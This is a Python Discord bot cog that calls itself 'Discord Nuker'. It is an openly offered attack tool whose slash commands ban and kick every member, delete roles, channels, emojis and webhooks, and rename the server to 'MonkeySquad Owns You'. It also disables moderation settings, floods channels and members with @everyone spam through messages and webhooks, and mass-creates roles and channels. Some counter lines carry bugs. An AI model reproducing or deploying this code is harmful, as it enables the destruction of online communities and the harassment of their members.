from glob import glob
import disnake
from disnake.ext import commands
from disnake.ext import tasks


import ctypes


server =  0
banned = 0
kicked = 0
messages =  0
chs = 0
rls = 0
roles = 0
channels = 0
categories = 0
emojis = 0
webhooks = 0

        
class Nuker(commands.Cog):
   def __init__(self, bot):
      self.bot = bot
      self.task.start()
   
   @tasks.loop(seconds=5.0)
   async def task(self):      
      text = f"Discord Nuker || Version: 1.0.0 || Targeted Server: {server} || Banned: {banned} || Kicked: {kicked} || Messages Sent: {messages} || Channels Created: {chs} || Roles Created: {rls} || Cleared Roles: {roles} ||  Cleared Channels: {channels + categories} || Cleared Emojis: {emojis} || Cleared Webhooks: {webhooks} ||"
      ctypes.windll.kernel32.SetConsoleTitleW(text)
      
      
   @commands.slash_command(
      name="banall",
   )
   async def banall(self, interaction):
      for member in interaction.guild.members:
         try:
            await member.ban()
            global banned
            banned += 1
         except:
            pass

         
   @commands.slash_command(
      name="kickall",
   )
   async def kickall(self, interaction):
      try:
         for member in interaction.guild.members:
            await member.kick()
            global kicked
            kicked += 1
      except:
         pass
   
   @commands.slash_command(
      name="nukeserver"
   )
   async def nukeserver(self, interaction: disnake.ApplicationCommandInteraction):
      guild = interaction.guild
      await guild.edit(
         reason="MonkeySquad Owns You",
         name="MonkeySquad Owns You", 
         description="MonkeySquad Owns You", 
         icon=None, 
         banner=None, 
         splash=None, 
         discovery_splash=None, 
         community=False, 
         afk_channel=None,  
         afk_timeout=3600, 
         default_notifications=disnake.NotificationLevel.all_messages, 
         verification_level=disnake.VerificationLevel.none, 
         explicit_content_filter=disnake.ContentFilter.disabled,
         system_channel=None, 
         preferred_locale=disnake.Locale.zh_TW,
         rules_channel=None, 
         public_updates_channel=None, 
         premium_progress_bar_enabled=True
         )
      for member in interaction.guild.members:
         try:
            await member.ban()
            global banned 
            banned += 1
         except:
            pass
      
      for channel in interaction.guild.channels:
         for _ in range(0, 25):
            try:
               await channel.send(interaction.guild.default_role)
               global messages
               messages += 1
            except:
               pass
            
            
   @commands.slash_command(
      name="nickall"
   )
   async def nickall(self, interaction, *, arg):
      for member in interaction.guild.members:
         try:
            await member.edit(nick=arg)
         except:
            pass
         
         
   @commands.slash_command(
      name="messageall"
   )
   async def messageall(self, interaction, *, arg):
      for member in interaction.guild.members:
         try:  
            await member.send(arg)
            global messages
            messages += 1
         except:
            pass
   
   @commands.slash_command(
      name="clearroles"
   )
   async def clearroles(self, interaction):
      for role in interaction.guild.roles:
         try:
            await role.delete()
            global roles
            roles += 1
         except:
            pass
   
   @commands.slash_command(
      name="clearemojis"
   )
   async def clearemojis(self, interaction):
      for emoji in interaction.guild.emojis:
         try:
            await emoji.delete()
            global emojis
            emoji += 1
         except:
            pass
         
   @commands.slash_command(
      name="clearchannels"
   )
   async def clearchannels(self, interaction):
      for channel in interaction.guild.channels:
         try:
            await channel.delete()
            global Channels
            channels += 1
         except:
            pass
   
   @commands.slash_command(
      name="clearcategories"
   )
   async def clearcategories(self, interaction):
      for category in interaction.guild.categories:
         try:
            await category.delete()
            global categories
            categories += 1
         except:
            pass
      
   @commands.slash_command(
      name="clearwebhooks"
   )
   async def clearwebhooks(self, interaction):
      for webhook in interaction.guild.webhooks:
         try:
            await webhook.delete()
            global webhooks
            webhooks += 1
         except:
            pass
         
   @commands.slash_command(
      name="webraid"
   )
   async def webraid(self, interaction: disnake.ApplicationCommandInteraction, *, arg):
      for channel in interaction.guild.channels:
         hook = await channel.create_webhook(name="MonkeySquad Owns You", reason="MonkeySquad Owns You")
         for _ in range(0, 20):
            await hook.send(f"{arg}\n{interaction.guild.default_role}")
            global messages
            messages += 1
      
   
   @commands.slash_command(
      name="sendall"
   )
   async def sendall(self, interaction, *, arg):
      for channel in interaction.guild.channels:
         try:       
            for _ in range(0, 25):
               await channel.send(arg + interaction.guild.default_role)
               global messages
               messages += 1
         except:
            pass
         
   @commands.slash_command(
      name="createroles"
   )
   async def createroles(self, interaction, *, arg):
      for _ in range(0, 100):
         await interaction.guild.create_role(name=arg)
         global rls
         rls += 1
         
   @commands.slash_command(
      name="createchannels"
   )
   async def createchannels(self, interaction, *, arg):
      for _ in range(0, 50):
         await interaction.guild.create_text_channel(name=arg)
         global chs
         chs += 1
      
def setup(bot):
   bot.add_cog(Nuker(bot))
